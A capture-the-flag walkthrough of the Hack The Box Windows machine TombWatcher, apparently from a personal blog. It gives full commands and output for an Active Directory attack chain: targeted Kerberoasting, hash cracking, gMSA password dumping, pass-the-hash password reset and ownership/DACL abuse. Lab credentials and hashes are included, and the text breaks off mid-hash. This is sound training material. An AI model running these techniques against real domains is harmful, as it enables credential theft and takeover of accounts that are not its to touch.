---
title: "Hackthebox Tombwatcher Walkthrough"
description: "Hackthebox TombWatcher Walkthrough"
date: 2026-01-26
categories: [Walkthrough]
tags: [hackthebox,TombWatcher,Walkthrough,Windows,ActiveDirectory]
image :
    path : https://lh3.googleusercontent.com/d/1myHS-g6S3ElyNZe1GQcHqgQssV9vBgeS
---

<img src="https://lh3.googleusercontent.com/d/10kMGmuUdbG_IArZHGRHGXwJJzrVutmcM" alt=""><br>

- TombWatcher is an Windows Active Directory Medium Level Machine....

## <span style="color: DarkSalmon;"><b># Enumeration</b></span> 
-----

> As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!
{: .prompt-info }

- Let's start with nmap scan ...

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ sudo nmap -sC -sV -p- 10.129.232.167 --min-rate=5000 -oN tombwatcher.nmap
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 03:54 -0500
Nmap scan report for 10.129.232.167
Host is up (0.11s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 12:54:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-01-25T12:56:20+00:00; +3h59m42s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T12:56:21+00:00; +3h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T12:56:20+00:00; +3h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-01-25T12:56:21+00:00; +3h59m42s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
53107/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-25T12:55:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m41s, deviation: 0s, median: 3h59m41s
```

- total 21 ports are open and FQDN we got is `dc01.tombwatcher.htb` and Domain Name `tombwatcher.htb`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ nxc ldap 10.129.232.167 -u henry -p 'H3nry_987TGV!'
[*] Initializing LDAP protocol database
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```
- then i check , that we can authenticate to the machine or not with the given credential ,
- first i check with the smb method and ldap method too.. ( just replace smb with ldap)

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' 
[*] Initializing SMB protocol database
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
```
- then i look for the shares we can access and what permissions we have on them , with given credentials ...

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!'  --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```

- you can also use the `smbmap` too 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ smbmap -H 10.129.232.167 -u Henry -p 'H3nry_987TGV!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.232.167:445	Name: tombwatcher.htb     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

- i looked around all the shared we had access to but didn't find and useful information .. 
- then i look for the users in the system using `netexec`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ nxc ldap 10.129.232.167 -u henry -p 'H3nry_987TGV!' --users 
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             [*] Enumerated 7 domain users: tombwatcher.htb
LDAP        10.129.232.167  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.232.167  389    DC01             Administrator                 2025-04-25 10:56:03 0        Built-in account for administering the computer/domain      
LDAP        10.129.232.167  389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.232.167  389    DC01             krbtgt                        2024-11-15 19:02:28 0        Key Distribution Center Service Account
LDAP        10.129.232.167  389    DC01             Henry                         2025-05-12 11:17:03 0
LDAP        10.129.232.167  389    DC01             Alfred                        2025-05-12 11:17:03 0
LDAP        10.129.232.167  389    DC01             sam                           2025-05-12 11:17:03 0
LDAP        10.129.232.167  389    DC01             john                          2025-05-19 09:25:10 0   
```

- and we got some users 

```text
Henry
Alfred
sam
john
krbtgt
Administrator
```

- then i use the `bloodhound-python` tool to collect the Active Directory Data using the given `Henry` credential..

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Labs/TombWatcher/ad]
└─$ bloodhound-python -u Henry -p 'H3nry_987TGV!' -ns 10.129.232.167 -d tombwatcher.htb -c all 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::e9fa:b066:c8bf:5cf8
INFO: Trying LDAP connection to dead:beef::e9fa:b066:c8bf:5cf8
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::e9fa:b066:c8bf:5cf8
INFO: Trying LDAP connection to dead:beef::e9fa:b066:c8bf:5cf8
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 22S
```

- after collecting bloodhound data , i open the file in bloodhound and maked user `Henry` as owned
-  and then i look for outbound connection from the user `Henry`

<img src="https://lh3.googleusercontent.com/d/15B1D7TdPRBxDKUuYv2dO9q2PTcCTyLVZ" alt="" /><br>

- so from the relationship graph , user `Henry` has `WriteSPN (Service Principal Name)` to the user alfred, this permission give us ability to add a SPN and then do a kerberos auth to obtain a crackable hash ( also called Targeted Kerberoasting) 
- then i check i can abuse this from linux ... 

<details>
<summary><b>🟢 More About WriteSPN and Targeted Kerberoasting</b></summary>
<div style="margin-top: 15px;">
    <h4 style="color: #2c3e50;">WriteSPN</h4>
    <p>
      In Active Directory, the <strong>WriteSPN</strong> permission is a specific control that allows a user to modify the <code>servicePrincipalName</code> (SPN) attribute of another object.
    </p>
    <p>
      In our scenario, where user <code>henry</code> has <code>WriteSPN</code> rights over user <code>alfred</code>, this creates a direct path for <strong>Targeted Kerberoasting</strong>.
    </p>

    <ul>
      <li>
        <strong>What is WriteSPN?</strong> An SPN is a unique identifier that Kerberos uses to associate a service instance with a service sign-on account. Usually, only service accounts (like those running SQL Server or IIS) have SPNs.
      </li>
    </ul>

    <p>
      When you have <code>WriteSPN</code> over a user like <code>alfred</code>, you can "turn him into a service account" by giving him an arbitrary SPN. This makes him eligible for a Kerberoasting attack, even if he was just a regular user before.
    </p>

    <hr>

    <h4 style="color: #2c3e50;">Targeted Kerberoasting</h4>
    <p>
      Targeted Kerberoasting is a specialized post-exploitation technique used to harvest credentials from Active Directory accounts that do not naturally possess a Service Principal Name (SPN). Unlike traditional Kerberoasting, which targets existing service accounts, this "targeted" approach leverages specific permissions, such as <code>GenericWrite</code>, <code>WriteProperty</code>, or <code>WriteSPN</code>—to manually assign a dummy SPN to a high-value user account.
    </p>
    <p>
      Once the SPN is set, the attacker can request a Kerberos service ticket (TGS) for that user, which is encrypted with the user's password hash. This ticket is then taken offline and subjected to brute-force or dictionary attacks to reveal the cleartext password. This method is particularly dangerous because it allows attackers to transform any standard or privileged user into a target for credential theft, often bypassing traditional service account security monitoring.
    </p>
  </div>
</details>

<img src="https://lh3.googleusercontent.com/d/1_jmo1hTDcOPaB_aJMGXRMzi3lDdcVl8b" alt="" /><br>

```bash
https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
```

- then i use `targetedKerberoast.py` python file to do Targeted Kerberoasting Attack

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'Henry' -p 'H3nry_987TGV!'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$c6bcd79f4d0c834515e0c71a9e44b13e$d26705c6e752ef29aef5f389f271d8bfd476cd06a82be55ca52eb407496bca5c1f569307110cfa648bd66f87e7815547980c6460f74563fb5e67f8416b09b6cff7790a14427f7ff53f0d6c08c2a7000114639283d09e76aa715d0839067faa915f7559c9e512a8a6b7419b59946ab43775242e452c539803ada4aa39014a9f0581f323bfbfe714465f2ca42db832eb9788ad4be6a9ab4307f4fbc65a833aa6167b44f41c8d483cf71262088179b2220129b834c9c02370c82705fed085957b5990bd20e7d5e711613426da7b4b6d204c585707b8feaab6073c77da4594a8d014cd29f5d2c26d991f30c2edc8cfcd62cf81db1232817d21e1a6bdb0efc5460aece945a0edd653387e9a2a9d59e47484ffb886f5f38c1c0e5f84b8606a9a85d875ff311adca1226c6edadf3fffb1fe392f67677d7e47fdaccafa54d2c83eb72bb07e55e01deffe695c6142a2a5bff727104fb709442a456a322a3a99238dbea4bcd0a2fcd38b4f49bbec9ec57de3bac9a92814744753a7a8a2fcf09661b8a826c8d3a652fc83463f5e6d886d60cf87a12fc777c849cef1b95ae5511e6a8c4a2afbced5cecc09793829934892824742090646e44a4d254059577f4a25855d960fc427abf24fe3aea5b30d45cd130250e29fc50a87a1d7c62e8e453ab4b602d37a2277b36a15f8f8f1e76cbc53c92ab11cb6135f658f3322ec253ed9d81220327ea3d7eff9d0d6239420f6bb431af3bb9ed9105c65eadcb5b562aae2e0b252186a1ca2aab67ef20518b61d44177ea8e40cf899f01063ea26ba67b3457ea802f695b7f0f52f4c6e6b7291faf79f324af3bbeebb4c6d3579400a0f45876a96a705bec82b98fe94c76ac66ebfef5b64ad5c81cc5d54bdb6f66572e43f17acc1b2f3486cd296e6d78e8ddb625e16fc075ce575b36cd6acf13d7c241f413721659ca8606ed04eca5648dffcb96fc45a6af5d54e18fcce97773b38cba7cd710ee82a8e466d2659e6aba6b4830be05c8f0059af4d7b83ff45e4eb4b66b5fabc64565ee545ddeea70d0e04706c16e522f1240b7ece36c1264b4a6f23002caacc1735e38d7b18c2bc17df0739678e7e3a8719b6009a2fa5e37100b66fb38f998a886135bda4a6ea61b08c626f2d0a8b081579d423199dc210d54b6f24a7e339ee8d856cac10dbebf8c51bb190cd7055f95a5ed29da927da4b063dcd4edf53ffa7d6acfbf0cde948d2fbaeeac1093b596aaf08297ff72b04de89bd1d637323fc36d04f5b01050c838353a57df7912e2de62c79e22b6c894033e317f9d9c5c52bfa011781734bb07be626fefbe92e065c237baec0c0c09d84236030fe4555a2911ddaa5354656294c6907e91cb2fd5d11f0d5b842c76620d98e3420eb944e2a352c90747057ce685f83c8805cf7d335af648fb44aa785a9657c2edfc0e1679ec984add7c5f4e7f1d550a756a7e9491b87b459f5cef710ed8419a7e2b6
[VERBOSE] SPN removed successfully for (Alfred)
```

- and i got the hash for user `alfred`
- then we use the `hashcat` tool to crack this hash

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt                          
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12450H, 3524/7049 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5594 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$c6bcd79f4d0c834515e0c71a9e44b13e$d26705c6e752ef29aef5f389f271d8bfd476cd06a82be55ca52eb407496bca5c1f569307110cfa648bd66f87e7815547980c6460f74563fb5e67f8416b09b6cff7790a14427f7ff53f0d6c08c2a7000114639283d09e76aa715d0839067faa915f7559c9e512a8a6b7419b59946ab43775242e452c539803ada4aa39014a9f0581f323bfbfe714465f2ca42db832eb9788ad4be6a9ab4307f4fbc65a833aa6167b44f41c8d483cf71262088179b2220129b834c9c02370c82705fed085957b5990bd20e7d5e711613426da7b4b6d204c585707b8feaab6073c77da4594a8d014cd29f5d2c26d991f30c2edc8cfcd62cf81db1232817d21e1a6bdb0efc5460aece945a0edd653387e9a2a9d59e47484ffb886f5f38c1c0e5f84b8606a9a85d875ff311adca1226c6edadf3fffb1fe392f67677d7e47fdaccafa54d2c83eb72bb07e55e01deffe695c6142a2a5bff727104fb709442a456a322a3a99238dbea4bcd0a2fcd38b4f49bbec9ec57de3bac9a92814744753a7a8a2fcf09661b8a826c8d3a652fc83463f5e6d886d60cf87a12fc777c849cef1b95ae5511e6a8c4a2afbced5cecc09793829934892824742090646e44a4d254059577f4a25855d960fc427abf24fe3aea5b30d45cd130250e29fc50a87a1d7c62e8e453ab4b602d37a2277b36a15f8f8f1e76cbc53c92ab11cb6135f658f3322ec253ed9d81220327ea3d7eff9d0d6239420f6bb431af3bb9ed9105c65eadcb5b562aae2e0b252186a1ca2aab67ef20518b61d44177ea8e40cf899f01063ea26ba67b3457ea802f695b7f0f52f4c6e6b7291faf79f324af3bbeebb4c6d3579400a0f45876a96a705bec82b98fe94c76ac66ebfef5b64ad5c81cc5d54bdb6f66572e43f17acc1b2f3486cd296e6d78e8ddb625e16fc075ce575b36cd6acf13d7c241f413721659ca8606ed04eca5648dffcb96fc45a6af5d54e18fcce97773b38cba7cd710ee82a8e466d2659e6aba6b4830be05c8f0059af4d7b83ff45e4eb4b66b5fabc64565ee545ddeea70d0e04706c16e522f1240b7ece36c1264b4a6f23002caacc1735e38d7b18c2bc17df0739678e7e3a8719b6009a2fa5e37100b66fb38f998a886135bda4a6ea61b08c626f2d0a8b081579d423199dc210d54b6f24a7e339ee8d856cac10dbebf8c51bb190cd7055f95a5ed29da927da4b063dcd4edf53ffa7d6acfbf0cde948d2fbaeeac1093b596aaf08297ff72b04de89bd1d637323fc36d04f5b01050c838353a57df7912e2de62c79e22b6c894033e317f9d9c5c52bfa011781734bb07be626fefbe92e065c237baec0c0c09d84236030fe4555a2911ddaa5354656294c6907e91cb2fd5d11f0d5b842c76620d98e3420eb944e2a352c90747057ce685f83c8805cf7d335af648fb44aa785a9657c2edfc0e1679ec984add7c5f4e7f1d550a756a7e9491b87b459f5cef710ed8419a7e2b6:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...a7e2b6
Time.Started.....: Sun Jan 25 08:25:32 2026 (1 sec)
Time.Estimated...: Sun Jan 25 08:25:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   720.1 kH/s (1.90ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> iheartyou
Hardware.Mon.#01.: Util: 17%

Started: Sun Jan 25 08:25:20 2026
Stopped: Sun Jan 25 08:25:34 2026
```

<img src="https://lh3.googleusercontent.com/d/15B1D7TdPRBxDKUuYv2dO9q2PTcCTyLVZ" alt="">

- and we successufly able to crack the password `alfred:basketball`
- in bloodhound graph , we can see that `Alfred` has `AddSelf` accees to the group `Infrastructure` . 

```bash
https://www.hackingarticles.in/addself-active-directory-abuse/
```

- So now we will add `Alfred` to this group using `BloodyAd`.

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ bloodyAD --host "10.129.232.167" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "Infrastructure" "Alfred"
[+] Alfred added to Infrastructure
```
- now from the abouce we can see that group `INFRASTRUCTURE` has `ReadGMSAPassword` to `ANSIBLE_DEV$` (Group managed service account)

<img src="https://lh3.googleusercontent.com/d/1XuPDxme4wgXP9N_zQp6XgCj5SkIwo3Sl" alt="">

<details>
<summary><b>🟢 More About Group managed service account</b></summary>
  <div style="margin-top: 15px;">
    <p>
      A <strong>Group Managed Service Account (gMSA)</strong> is a specialized type of Active Directory (AD) account designed to automate and secure service identities. It is the modern standard for running services like SQL Server, IIS, or scheduled tasks.
    </p>

    <h3 style="color: #2c3e50;">🛡️ Why gMSAs are Important</h3>
    <p>
      Traditional service accounts are often just regular user accounts with weak passwords that are rarely rotated. This makes them easy targets for <strong>Kerberoasting</strong> or <strong>Brute Force</strong> attacks.
    </p>

    <p><strong>gMSAs solve this with three core features:</strong></p>
    <ul>
      <li><strong>Automatic Password Management:</strong> AD generates a complex, 240-byte random password.</li>
      <li><strong>Automatic Rotation:</strong> Windows changes the password every 30 days automatically. No human ever knows the password.</li>
      <li><strong>Shared Identity:</strong> A gMSA can be shared across a "group" of servers (like a web farm or cluster).</li>
    </ul>

    <hr>

    <h3 style="color: #2c3e50;">⚙️ How it Works</h3>
    
    <p>
      The process is handled entirely by the infrastructure to ensure security and zero downtime:
    </p>

    <ul>
      <li>
        <strong>KDS Root Key:</strong> The Domain Controller uses a <em>Key Distribution Service</em> (KDS) root key to generate the gMSA passwords.
      </li>
      <li>
        <strong>Authorized Hosts:</strong> You define a security group of computer accounts that are allowed to "request" the password.
      </li>
      <li>
        <strong>Password Retrieval:</strong> When a service starts, the server securely asks the Domain Controller for the current password and logs in automatically.
      </li>
    </ul>
  </div>
</details>

- now we will dump the creds by using `gMSADumper.py`

<details>
<summary><b>🟢 More About gMSADumper.py</b></summary>
<div style="margin-top: 15px;">
    <p>
      <strong>gMSADumper.py</strong> is a specialized Python tool used to read the passwords of Group Managed Service Accounts (gMSA). It is part of a security professional's toolkit for checking if AD accounts are properly protected.
    </p>

    <h3 style="color: #2c3e50;">🔍 What does it do?</h3>
    <p>
      Even though humans aren't supposed to know gMSA passwords, they are stored in an attribute called <code>msDS-ManagedPassword</code>. If a user has the right permissions, they can read this attribute. <strong>gMSADumper.py</strong> automates this by:
    </p>
    
    <ul>
      <li>Connecting to the Domain Controller.</li>
      <li>Finding all gMSA accounts you have permission to "read."</li>
      <li>Decrypting the password and showing it to you in <strong>NTLM hash</strong> format.</li>
    </ul>

    <hr>

    <h3 style="color: #2c3e50;">⚠️ Why is this a risk?</h3>
    <p>
      If an attacker compromises a computer or a user that is authorized to use a gMSA, they can use this tool to steal the service account's credentials. Once they have the hash, they can "impersonate" that service to move deeper into the network.
    </p>

    <p><strong>Common Usage:</strong></p>
    <code>python3 gMSADumper.py -u 'username' -p 'password' -d 'domain.local'</code>

  </div>
</details>


```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ python3 gMSADumper.py -u 'Alfred' -p 'basketball' -d 'tombwatcher.htb'

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::22d7972cb291784b28f3b6f5bc79e4cf
ansible_dev$:aes256-cts-hmac-sha1-96:9a613b6a69c60404a3dc55438f554d2774694707b1dcc2bb20f6442af2b73b47
ansible_dev$:aes128-cts-hmac-sha1-96:713c1cb78f7c2803107e36747c45785b
```

<img src="https://lh3.googleusercontent.com/d/15B1D7TdPRBxDKUuYv2dO9q2PTcCTyLVZ" alt="">

- and we got NTLM hash for `ansible_dev$`
- now from the bloodhound graph we can see that `ansible_dev$` had `ForceChangePassword` to the user SAM .
- so, now we will change the password for user `sam`

- we can use `pth-net` to do this ... 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ pth-net rpc password "sam" "NothingHere9$" -U tombwatcher.htb/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"22d7972cb291784b28f3b6f5bc79e4cf" -S tombwatcher.htb
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

- and we can cross check this via `netexec`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ nxc ldap 10.129.232.167 -u 'sam' -p 'NothingHere9$'                                
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\sam:NothingHere9$ 
```

## <span style="color: DarkSalmon;"><b># User Exploitation</b></span> 
----------

<img src="https://lh3.googleusercontent.com/d/1XuPDxme4wgXP9N_zQp6XgCj5SkIwo3Sl" alt="">

- and looking back at the bloodhound graph , we can see that user `sam` has `WriteOwner` permisson on user `john`

```bash
https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
```

- for this we use `impacket-owneredit` tool to change the owner of the user `john`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ impacket-owneredit -action write -new-owner 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'NothingHere9$' -dc-ip 10.129.232.167
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

- then we will give FullControl or say `GenericAll` to sam over `john`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'NothingHere9$' -dc-ip 10.129.232.167                                           
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260125-091148.bak
[*] DACL modified successfully!
```
- now we can dump the hash of user `john`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'sam' -p 'NothingHere9$'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (john)
[+] Printing hash for (john)
$krb5tgs$23$*john$TOMBWATCHER.HTB$tombwatcher.htb/john*$e1d52917477c8ec4d93604b4afda6b8a$c3bd63f6be0d73240c441830e28cdde23e0551349d0badbbd838057c3be16ab5ccadbb8fc71caafa04ac650ba128c24792c464ba054c1a37043f1fa15217e52f0fb3bc04f2c62e01f267d39274b7c4c28dd81f95a7a3ae81c1737e0814baca19c563ae3a5c637d3eb9fd9b6aa508c9fa20593d38d1c502c4d244ce554265d318df6ad3eacd4d6b1210269bc8e275277a07e444e94f8879788740480d5b2985403729246c574f81002ef59b7f17cf5cd687cd3c066c5bb5791736e1c49af904496c8de45ead95e6b592ce3ff381e7ec103801aea15cdf5c683a51ad66dd561466ee210db5442c8399b162e987e697ee4dc0afd6e0678099d2209ff0dde586409cf73dadff04ccc0f30b63fb7ecb090513ca8c6b7a09b35508ce503a1ee1d98967b20155d00563b439519ca86c4126e08d756393a69e29620f845421f646d0ca04499ab31bc7b695e003b880f6ea40b8910165c530b8db86c20f780d27e8c2fec946a971487e338e092119baeaeed51dfe4d315441de2c344f8a6d0a98fa581b8919865f38ea3acff4d7bab759da4c9c4511de961d62f8c2532661f784c6cc02694b1404366241fe753c262848334c8928dd0edd99da8edfceb4319ff1247